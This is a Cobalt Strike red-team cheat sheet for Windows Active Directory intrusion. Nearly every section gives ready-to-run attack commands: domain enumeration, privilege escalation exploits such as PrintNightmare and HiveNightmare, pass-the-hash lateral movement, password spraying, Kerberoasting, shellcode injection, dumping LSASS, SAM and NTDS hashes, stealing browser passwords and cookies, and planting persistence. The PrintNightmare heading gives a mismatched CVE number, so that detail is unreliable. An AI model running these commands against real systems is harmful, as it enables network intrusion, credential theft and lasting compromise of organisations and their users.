# Cobalt Strike Red Team Cheat Sheet

## Malleable C2 Profiles

A collection of tools used to generate new malleable C2 profiles to use with Cobalt Strike and better obfuscate your traffic/commands.

- [Random C2 Profile](https://github.com/threatexpress/random_c2_profile)
- [Malleable C2](https://github.com/threatexpress/malleable-c2)
- [Malleable C2 Profiles](https://github.com/xx0hcd/Malleable-C2-Profiles)
- [C2concealer](https://github.com/FortyNorthSecurity/C2concealer)
- [SourcePoint](https://github.com/Tylous/SourcePoint)
-----------------------------------------------------------------------------------------
## Domain Enumeration

Running PowerView and SharpView
```
# PowerView:
powershell-import --> Select PowerView.ps1 to import PS1 file in memory
powershell Get-Module PowerView
powershell Get-NetUser -Identity testuser -Domain lab.com

# SharpView
execute-assembly C:\SharpView.exe Invoke-CheckLocalAdminAccess --> Check servers for local admin using current privileges
```

Running ActiveDirectory module
```
powershell import --> Select \ADModule\Microsoft.ActiveDirectory.Management.dll  file from https://github.com/samratashok/ADModule
powershell Get-ADDomainController -Domain lab.com
```

Running Sharphound (.NET version of Bloodhound) for AD domain collection
```
# Running SharpView in memory (.NET version of PowerView)
execute-assembly C:\SharpHound.exe --CollectionMethod All --Domain lab.com --Stealth --excludedomaincontrollers --windowsonly --OutputDirectory C:\users\testuser\appdata\local\temp\

# Collecting only user sessions to determine who is logged in and where:
execute-assembly C:\SharpHound.exe --CollectionMethod Session,LoggedOn --Outputdirectory C:\temp\

# Collection methods reference: https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html
```

[AD Recon tool](https://github.com/adrecon/ADRecon) - Perform different collection methods (ACLs, OUs, DCs, etc.) and output to Excel files
```
powershell-import --> ADRecon.ps1
# Perform all collection methods:
powershell ADRecon -OutputDir .\ -DomainController ops-dc.lab.com
```

**Domain SMB Shares Enumeration**<br>
[SharpShares](https://github.com/mitchmoser/SharpShares) - List accessible shares on remote systems and check read/write privileges<br>
```
execute-assembly SharpShares.exe /ldap:all /filter:sysvol,netlogon,ipc$,print$
```

-----------------------------------------------------------------------------------------
## Local Privilege Escalation
### [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) - PowerSploit module
```
powershell-import --> PowerUp.ps1
powerpick Invoke-AllChecks | Out-File -Encoding ASCII PowerUp-checks.txt
```

### [SharpUp](https://github.com/GhostPack/SharpUp) - .NET port of PowerUp
```
# Run all checks automatically - output to console
execute-assembly C:\SharpUp.exe
```

### [SeatBelt](https://github.com/GhostPack/Seatbelt) - .NET tool by GhostPack  
GREAT tool to query a local system to gather system/user/remote/misc data
Can be used as Admin or normal-privileged user  
```
# Run ALL checks - returns TONS of data
execute-assembly C:\SeatBelt.exe -group=all -full -outputfile="C:\Temp\SeatBelt-all.json"

# Run only user-related checks - returns things like Chrome data, DPAPI keys, IE tabs, Windows vault/credentials, etc.
execute-assembly C:\SeatBelt.exe -group=user -outputfile="C:\Temp\SeatBelt-user.json"

# Run only system-related checks - returns things like Antivirus, Applocker, env path/variables, local users/groups, WMI, sysmon, UAC, etc.
execute-assembly C:\SeatBelt.exe -group=system -outputfile="C:\Temp\SeatBelt-system.json"

# Run only Chrome checks - returns bookmarks, history, presence
execute-assembly C:\SeatBelt.exe -group=chromium -outputfile="C:\Temp\SeatBelt-chrome.json"

# Run only remote-related checks - returns things like network shares, putty sessions, RDP connections/settings, Filezilla, Windows firewall, etc.
execute-assembly C:\SeatBelt.exe -group=remote -outputfile="C:\Temp\SeatBelt-remote.json"

# Run only miscellaneous-related checks - returns things like Chrome data, logon events, LOBAS, interesting files, downloads, PS events, scheduled tasks, etc.
execute-assembly C:\SeatBelt.exe -group=misc -outputfile="C:\Temp\SeatBelt-misc.json"
```

### Watson - .NET version of Sherlock.ps1 to look for missing KBs on Windows
```
# Peroform all checks and output to console
# Supports:
    Windows 10 1507, 1511, 1607, 1703, 1709, 1803, 1809, 1903, 1909, 2004
    Server 2016 & 2019
execute-assembly C:\Watson.exe 
```

### PrintNightmare priv esc exploit (CVE-2021-3452)
```
# Impacket's PrintNightmare: https://github.com/cube0x0/CVE-2021-1675
# Impacket's SharpNightmare (Csharp): https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare
# PowerShell PrintNightmare local priv esc: https://github.com/calebstewart/CVE-2021-1675

# Local priv esc
execute-assembly C:\SharpPrintNightmare.exe C:\addCube.dll

# RCE using existing context
execute-assembly C:\SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.20'

# RCE using runas /netonly
execute-assembly C:\SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.10' hackit.local domain_user Pass123
```

### HiveNightmare priv esc SAM dump (CVE-2021–36934)
Exploit in Windows 10 and 11 which allows you to read the SAM, SYSTEM and SECURITY hives as a low-privileged user
```
# First check privileges to read SAM hive
run icacls C:\Windows\System32\config\SAM
--> If the results show success and the group BUILTIN\Users has privileges (I)(RX) then the SAM file should be readable by all users! 

# Exploit: Csharp implementation [HERE](https://github.com/cube0x0/CVE-2021-36934)
execute-assembly C:\CVE-2021-36934.exe
--> Dumps hashes to console upon successful exploitation
```

------------------------------------------------------------------------------------------
## Lateral Movement
Cobalt Strike jumping (OUTDATED)
```
# Jump using WinRM if it's enabled for the current user on the target system
jump winrm64 ops-jumpbox.lab.com HTTPSLISTENER

# Jump using PsExec if it's enabled for the current user on the target system
jump psexec64 ops-jumpbox.lab.com HTTPSLISTENER
```

Cobalt Strike remote-exec - Executes commands on a target system using psexec, winrm or wmi (OUTDATED)
```
# remote-exec using WMI
remote-exec wmi ops-jumpbox.lab.com cmd.exe /c "C:\Users\Public\payload.exe"

# remote-exec using PsExec
remote-exec psexec ops-jumpbox.lab.com cmd.exe /c "C:\Users\Public\payload.exe"
```

Enable Powershell Remoting manually
```
# Enable on local system with Admin privileges
powershell Enable-PSRemoting –Force

# Enable on remote system 
make_token AD\admin Password123! --> Token with Admin privileges on remote system is required
run psexec.exe \\TestComputer.lab.com -h -s powershell.exe Enable-PSRemoting -Force

# Test remote access
powershell Invoke-Command -ComputerName TestComputer -ScriptBlock { whoami; hostname }
```

[RACE.ps1](https://github.com/samratashok/RACE): ACL attacks for lateral movement, persistence and privilege escalation
Stealthier than above method since it doesn't touch disk
```
powershell-import --> RACE.ps1
make_token AD\Admin password --> This tool requires Admin privileges on the remote system being targeted

powershell Set-RemotePSRemoting -SamAccountName testuser -ComputerName ops-jumpbox.lab.com --> Force enable PS remoting for the specific user
powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-jumpbox.lab.com --> (Optional) Force enable WMI for the specific user

# Now we can move laterally in CS with WinRM for the specified user
make_token AD\testuser password
jump [winrm/winrm64] ops-jumpbox.lab.com HTTPSLISTENER
```

[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) - PS tools to perform SMB and WMI pass-the-hash attacks
```
powershell-import 
powerpick Invoke-WMIExec -Target 192.168.100.20 -Domain LAB.com -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose
powerpick Invoke-SMBExec -Target 192.168.100.20 -Domain LAB.com -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose
```

Over-pass-the-hash with Rubeus
Inject a ticket into memory using known credentials and then move to a system that user has access to
```
# Revert to original token in CS
rev2self
# Create and inject new ticket into memory
execute-assembly C:\Rubeus.exe asktgt /domain:lab.com /user:admin1 /rc4:<NTLM-hash> /ptt
# Run network commands as that user
ls \\jumpbox.lab.com\C$
jump winrm64 jumpbox.lab.com
```

[Move Kit](https://github.com/0xthirteen/MoveKit)
Aggressor script using execute-assembly, SharpMove and SharpRPD assemblies for doing lateral movement with various techniques

[SharpExec](https://github.com/anthemtotheego/SharpExec) - CSharp tooling lateral movement
```
# WMI lateral movement
execute-assembly SharpExec.exe -m=wmi -i=IPADDRESS -u=USER -p=PASSWORD -d=DOMAIN -e=C:\Windows\System32\cmd.exe -c="/c C:\path\to\payload"

# PSExec lateral movement
execute-assembly SharpExec.exe -m=psexec -i=IPADDRESS -u=USER -p=PASSWORD -d=DOMAIN -e=C:\Windows\System32\cmd.exe -c="/c C:\path\to\payload"
```

------------------------------------------------------------------------------------------
## Local Privilege Escalation

[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe) - Windows Privilege Escalation Awesome Script<br>
```execute-assembly winpeas.exe #run all checks```<br>

[SharpUp](https://github.com/GhostPack/SharpUp) - SharpUp - GhostPack CSharp tool<br>
```
execute-assembly SharpUp.exe audit # run all checks
execute-assembly SharpUp.exe HijackablePaths # run individual check
```

------------------------------------------------------------------------------------------
## Domain Privilege Escalation
### GPP Passwords
[Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) PowerSploit module
```
# Get-GPPPassword Searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords
powershell-import --> Get-GPPPassword.ps1
powerpick Get-GPPPassword -Server ops-dc01.lab.com
```
[Net-GPPPassword](https://github.com/outflanknl/Net-GPPPassword) .NET port of get-gpppassword
```
execute-assembly C:\Net-GPPPassword.exe lab.com
```
[Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) PowerSploit module
```
# Get-GPPAutologn searches the domain controller for registry.xml to find autologon information and returns the username and password
powershell-import --> Get-GPPAutologon.ps1
powerpick Get-GPPAutolgon
```

### LAPS Passwords
[SharpLaps](https://github.com/swisskyrepo/SharpLAPS) - Retrive LAPS password from AD<br>
The attribute ms-mcs-AdmPwd stores the clear-text LAPS password which is targeted here from LDAP<br>
``` execute-assembly SharpLAPS.exe /user:DOMAIN\USER /pass:PASSWORD /host:IPADDRESS```


### Password spraying
[DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)
```
powershell-import --> DomainPasswordSpray.ps1
# Get the full domain user list (Optional)
powershell Get-DomainUserList -Domain lab.com -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt

# Password spray from a username and password list
powershell Invoke-DomainPasswordSpray -UserList userlist.txt -PasswordList passlist.txt -Domain lab.com -OutFile sprayed-creds.txt

# Auto spray a specific password on an auto-generated user list (very noisy)
powershell Invoke-DomainPasswordSpray -Password Summer2021
```
Rubeus brute-force password spraying a single password or using a password file
```
execute-assembbly C:\Rubeus.exe brute /password:Password123! /domain:lab.com /noticket /outfile:passes-sprayed.txt [/passwords:PASSWORDS_FILE>] [/user:USER | /users:USERS_FILE] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/dc:DOMAIN_CONTROLLER]  [/verbose] [/nowrap]
```
[SharpSpray](https://github.com/jnqpblc/SharpSpray) - .NET port of PowerSpray.ps1
```
# By default it will automatically generate a user list from the domain using LDAP
# Sleeps 30 minutes between each password cycle, delays 300 milliseconds between each password guess attempt
execute-assembly C:\SharpSpray.exe --Passwords Summer2021,Fall2021 --Sleep 30 --Delay 300
```

### Kerberoasting
PowerView kerberoasting (Outdated and still reliant on PowerShell)
```
# Get users with SPN set
powershell Get-DomainUesr -SPN

# Kerberoast all users
powershell Invoke-Kerberoast - OutputFormat hashcat | fl

# Kerberoast specific user
powershell Invoke-Kerberoast -Identity testaccount -Domain lab.com -OutputFormat hashcat | fl
```

Rubeus kerberoasting
```
# Kerberoast all users
execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHashes.txt /domain:lab.com

# Kerberoast specific user
execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccount /domain:lab.com
```

### AS-REP Roasting
Target users in AD that do not require pre-authentication<br />
```
# AS-REP roast all users with Rubeus
execute-assembly C:\Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\asrep-hashes.txt

# AS-REP roast specific user with Rubeus
execute-assembly C:\Rubeus.exe asreproast /user:testuser /format:hashcat /outfile:C:\Temp\asrep-hashes.txt
```

------------------------------------------------------------------------------------------
## Defense Evasion

### Shellcode injection
Several methods here within Cobalt Strike or using BOFs
```
# Spawn a beacon into an existing process
inject <PID> <x86|x64> HTTPSLISTENER

# Inject raw shellcode into an existing process
# Create shellcode: Cobbalt Strike --> Attacks --> Packages --> Windows Executable (S) --> Output = Raw --> Creates "beacon.bin" file
shinect <PID> <x86|x64> C:\beacon.bin

# Shellcode injection using Windows syscalls with [BOF script](https://github.com/ajpc500/BOFs)
syscalls_shinject <PID> C:\beacon.bin
```

------------------------------------------------------------------------------------------
## Exploitation

### DPAPI decryption and extraction on Windows systems
[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
```
# SharpDPAPI to retrieve domain DPAPI backup key and output to file which is used for subsequent attacks (requires DA privileges)
execute-assembly C:\SharpDPAPI.exe backupkey /file:key.pvk

# Decrypt any RDG (remote desktop) passwords found using the domain backup key (can also use local Admin account or master key)
execute-assembly C:\SharpDPAPI.exe rdg /pvk:key.pvk /unprotect

# Decrypt any KeePass passwords found using the domain backup key (can also use local Admin account or master key)
execute-assembly C:\SharpDPAPI.exe keepass /pvk:key.pvk /unprotect
```

SharpChrome to extract and decrypt a user's Chrome sessions/passwords
```
# Dump Chrome logins on the local system for the current user
execute-assembly C:\SharpChrome.exe logins /unprotect

# Dump Chrome cookies on the local system for the current user
execute-assembly C:\SharpChrome.exe cookies

# Dump Chrome cookies on the local system only for a specific URL - Output in JSON format to import into "Cookie Editor" browser extension
execute-assembly C:\SharpChrome.exe cookies /format:json /browser:chrome /url:".*microsoft.com"

# Dumping Chrome login passwords on remote machines using the domain backup key (can also use local user password)
execute-assembly C:\SharpChrome.exe logins /pvk:key.pvk /server:SERVER.lab.com

# Dumping and decryptiong Chrome user cookies and sessions on remote machines using the domain backup key (can also use local user password)
# Cookies can then be imported into Chrome/Firefox using the extension Cookie-Editor
execute-assembly C:\SharpChrome.exe cookies /pvk:key.pvk /server:SERVER.lab.com
```

### [SharpWeb](https://github.com/djhohnstein/SharpWeb) - Retrieve saved credentials in Chrome, Firefox and Edge
```
# Retrive all saved browser credentials
execute-assembly C:\SharpWeb.exe all
```

### Active Directory Certificate Services (AD CS) Attack
[Certify - GhostPack](https://github.com/GhostPack/Certify) <br />
Enumerate and abuse misconfigurations in AD CS <br />
```
# Find vulnerable certificates with Certify.exe
execute-assembly C:\Certify.exe find /vulnerable /domain:lab.com

# Request a new certificate for a vulnerable template from the above output 
execute-assembly C:\Certify.exe request /ca:lab.com\ops-dc01 /template:VulnTemplate /altname:DomainAdminUser1

# Copy the certificate private key from the above output to a file, then request a TGT using the certificate file with Rubeus.exe
execute-assembly C:\Rubeus.exe asktgt /user:DomainAdminUser1 /certificate:C:\Temp\cert.pfx /domain:lab.com
```
------------------------------------------------------------------------------------------
## Exfiltration - Password Attacks

### Dumping LSASS locally (all commands below require local Admin)
Mimikatz built-in to dump passwords/hashes to console
```
# Works against most updated systems with AV/EDR if running as SYSTEM
logonpasswords
```
Dumping LSASS with ProcDump.exe (requires touching disk) (NOTE: Might get flagged by AV and raise alerts but can still output LSASS dump file)
```
upload --> ProcDump.exe
run ProcDump.exe -accepteula -ma lsass.exe lsass.dmp
```
Dumping LSASS with [Out-Minidump.ps1 from PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1) without touching disk
```
powershell Get-Process | Out-Minidump -DumpFilePath C:\temp
```
Extract LSASS process with [SafetyKatz](https://github.com/GhostPack/SafetyKatz)
```
execute-assembly C:\SafetyKatz.exe --> Dumps LSASS process to .dmp file on the local system
```
Extracting passwords/hashes offline from LSASS dump using Mimikatz (**ON YOUR OWN SYSTEM!**)
```
mimikatz.exe log "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords /all" "sekurlsa::wdigest" exit (Run on your local box)
```


### SAM database dump 

SAM dump built into CS - Injects into LSASS to dump local SAM database hashes to console
```
hashdump
```
SAM dump using reg.exe
```
run reg.exe save HKLM\sam sam.save
run reg.exe save HKLM\security security.save
run reg.exe save HKLM\system system.save

# Download SAM files then dump hahses offline using Secretsdump.py 
download sam.save
download security.save
download system.save
python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL (Run **ON YOUR OWN SYSTEM**)
```

### [SharpSecDump](https://github.com/G0ldenGunSec/SharpSecDump) SAM and LSA extraction
Remotely dump SAM and LSA secrets (same functionality as Impacket's secretsdump.py)
```
# Runs in the context of the current user
# Local Admin privileges is required on the target machine
execute-assembly C:\SharpSecDump.exe -target=192.168.1.15 -u=admin -p=Password123 -d=lab.local
```

### NTDS.dit dump (all commands below require Domain Admin privileges!)

[Invoke-DCSync.ps1](https://gist.github.com/monoxgas/9d238accd969550136db) to perform DCSync attacks remotely 
```
powershell-import --> Invoke-DCSync.ps1

# Perform DC Sync hash dump for all users in the target domain
powershell Invoke-DCSync -Domain lab.local [-DomainController ops-dc01.lab.local] 

# Perform DC Sync hash dump for all users in the specified group
powershell Invoke-DCSync -Domain lab.local -GroupName "Domain Admins" | ft -wrap -autosize
```
[Copy-VSS.ps1 from Nishang toolkit](https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1) to dump NTDS.dit locally on the DC
```
powershell-import --> Copy-VSS.ps1
powerpick Copy-VSS -DestinationDir C:\temp
```
NTDSutil.exe to dump NTDS.dit locally on a Domain Controller
```
run ntdsutil.exe activate instance ntds,ifm,create full C:\ntdsutil,quit,quit | ntdsutil
```
------------------------------------------------------------------------------------------
## Persistence
[SharpStay](https://github.com/0xthirteen/SharpStay) - .NET Persistence
```
# Scheduled task persistence
execute-assembly C:\Sharpstay.exe action=ScheduledTask taskname=TestTask command="C:\windows\temp\file.exe" runasuser=testuser triggertype=logon author=Microsoft Corp. description="Test Task" logonuser=testuser

# Service creation persistence
execute-assembly C:\Sharpstay.exe action=CreateService servicename=TestService command="C:\Windows\temp\file.exe"

# User registry key persistence
execute-assembly C:\Sharpstay.exe action=UserRegistryKey keyname=Debug keypath=HKCU:Software\Microsoft\Windows\CurrentVersion\Run command="C:\Windows\temp\file.exe"

# Many other methods available on the tool's github documentation
```
[SharpPersist](https://github.com/fireeye/SharPersist)
```
# List persistence entries
execute-assembly C:\SharPersist.exe -t [reg,schtaskbackdoor,startupfolder,service] -m list

# Registy persistence
execute-assembly C:\SharPersist.exe -t reg -c "C:\Windows\System32\cmd.exe" -a "/c payload.exe" -k "hkcurun" -v "Test Payload" -m add -o env

# Scheduled task backdoor persistence
execute-assembly C:\SharPersist.exe -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c payload.exe" -n "Test Scheduled Task" -m add -o daily

# Startup folder persistence
execute-assembly C:\SharPersist.exe -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c payload.exe" -f "Test File on Startup" -m add

# Windows service persistence
execute-assembly C:\SharPersist.exe -t service -c "C:\Windows\System32\cmd.exe" -a "/c payload.exe" -n "Test Service" -m add
```

[StayKit](https://github.com/0xthirteen/StayKit) - Cobalt Strike persistence kit aggressor script

------------------------------------------------------------------------------------------
# Cobalt Strike BOFs
[My BOF Collection GitHub page](https://github.com/wsummerhill/CobaltStrike_BOF_Collections)

------------------------------------------------------------------------------------------
# References
[Cobalt Strike commands cheat sheet](https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet) 

[AD exploitation cheat sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet) 

[Sharphound](https://github.com/BloodHoundAD/SharpHound3) 

[PowerShell remoting cheat sheet](https://blog.netspi.com/powershell-remoting-cheatsheet/) 

[Mimikatz reference cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md) 

[SpectreOps Cobalt Strike command reference](https://xzfile.aliyuncs.com/upload/affix/20190126174144-9767f9f2-214e-1.pdf) 

